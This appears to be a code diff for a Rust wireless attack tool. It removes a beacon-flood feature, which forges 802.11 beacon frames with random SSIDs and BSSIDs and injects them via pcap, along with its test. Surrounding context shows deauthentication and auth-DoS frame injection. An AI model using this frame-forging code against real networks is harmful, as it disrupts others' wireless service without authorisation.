@@ -12,7 +12,7 @@ use std::time::Duration;
 use crate::types::DeauthScope;
 #[cfg(all(not(feature = "demo"), target_os = "linux"))]
 use crate::types::channel_to_freq_mhz;
-use crate::types::{AttackCommand, AttackEvent, AttackMode, AttackType, Band, Target};
+use crate::types::{AttackCommand, AttackEvent, AttackMode, AttackType, Target};
 
 // ── Shared helpers ────────────────────────────────────────────────────────────
 
@@ -202,9 +202,6 @@ pub fn start_attack(
                                             }
                                         }
                                     }
-                                    AttackType::BeaconFlood => {
-                                        send_beacon_flood_frame(&mut sender, ch, band);
-                                    }
                                 }
                                 target_states[idx].deauth_count += 1;
                             }
@@ -305,9 +302,6 @@ pub fn start_attack(
                                                 }
                                             }
                                         }
-                                    }
-                                    AttackType::BeaconFlood => {
-                                        send_beacon_flood_frame(&mut sender, ch, band);
                                     }
                                 }
                                 target_states[idx].deauth_count += 1;
@@ -484,50 +478,6 @@ pub(crate) fn build_auth_dos_frame(bssid_str: &str) -> Vec<u8> {
     wrap_radiotap(&frame)
 }
 
-/// Fake beacon with random SSID/BSSID. Supported-rates IE and DS-Parameter tag
-/// are chosen per band (2.4 GHz carries 802.11b CCK rates + a DS channel tag;
-/// 5/6 GHz is OFDM-only and omits the DS tag).
-pub(crate) fn build_beacon_flood_frame(channel: u8, band: Band) -> Vec<u8> {
-    use rand::Rng;
-    let mut rng = rand::thread_rng();
-    let seq = next_seq();
-    let fake_bssid: [u8; 6] = [
-        0x02 | (rng.gen::<u8>() & 0xFE),
-        rng.gen(),
-        rng.gen(),
-        rng.gen(),
-        rng.gen(),
-        rng.gen(),
-    ];
-    let ssid_len = rng.gen_range(6..=12usize);
-    let ssid: Vec<u8> = (0..ssid_len).map(|_| rng.gen_range(0x41u8..=0x5Au8)).collect();
-    let broadcast = [0xFFu8; 6];
-
-    let mut frame = Vec::with_capacity(64);
-    frame.extend_from_slice(&0x0080u16.to_le_bytes()); // FC: beacon (subtype 8)
-    frame.extend_from_slice(&0x0000u16.to_le_bytes()); // duration
-    frame.extend_from_slice(&broadcast);
-    frame.extend_from_slice(&fake_bssid);
-    frame.extend_from_slice(&fake_bssid);
-    frame.extend_from_slice(&seq.to_le_bytes());
-    frame.extend_from_slice(&[0u8; 8]); // timestamp
-    frame.extend_from_slice(&[0x64, 0x00]); // beacon interval
-    frame.extend_from_slice(&[0x01, 0x04]); // capability: ESS
-    frame.push(0x00);
-    frame.push(ssid_len as u8);
-    frame.extend_from_slice(&ssid); // SSID IE
-    match band {
-        Band::TwoGHz => {
-            frame.extend_from_slice(&[0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24]);
-            frame.extend_from_slice(&[0x03, 0x01, channel]); // DS Parameter Set
-        }
-        _ => {
-            frame.extend_from_slice(&[0x01, 0x08, 0x0C, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6C]);
-        }
-    }
-    wrap_radiotap(&frame)
-}
-
 // ── Senders (Linux pcap injection) ────────────────────────────────────────────
 
 #[cfg(all(not(feature = "demo"), target_os = "linux"))]
@@ -545,11 +495,6 @@ fn send_client_deauth(cap: &mut pcap::Capture<pcap::Active>, ap_bssid: &str, cli
 #[cfg(all(not(feature = "demo"), target_os = "linux"))]
 fn send_auth_dos_frame(cap: &mut pcap::Capture<pcap::Active>, bssid: &str) {
     let _ = cap.sendpacket(build_auth_dos_frame(bssid).as_slice());
-}
-
-#[cfg(all(not(feature = "demo"), target_os = "linux"))]
-fn send_beacon_flood_frame(cap: &mut pcap::Capture<pcap::Active>, channel: u8, band: Band) {
-    let _ = cap.sendpacket(build_beacon_flood_frame(channel, band).as_slice());
 }
 
 #[allow(dead_code)]
@@ -713,20 +658,6 @@ mod tests {
         assert_eq!(p[RT + 10] & 0x03, 0x02);
     }
 
-    #[test]
-    fn beacon_flood_is_band_aware() {
-        let two = build_beacon_flood_frame(6, Band::TwoGHz);
-        let five = build_beacon_flood_frame(36, Band::FiveGHz);
-        assert_eq!(u16::from_le_bytes([two[RT], two[RT + 1]]), 0x0080); // FC beacon
-        // 2.4 GHz advertises 802.11b CCK rates (random SSID makes total length vary,
-        // so match the rate IE rather than comparing lengths).
-        assert!(two.windows(4).any(|w| w == [0x82, 0x84, 0x8B, 0x96]));
-        // 5 GHz uses the OFDM-only supported-rates IE and omits CCK rates.
-        assert!(five
-            .windows(10)
-            .any(|w| w == [0x01, 0x08, 0x0C, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6C]));
-        assert!(!five.windows(4).any(|w| w == [0x82, 0x84, 0x8B, 0x96]));
-    }
 
     #[test]
     fn seq_advances() {
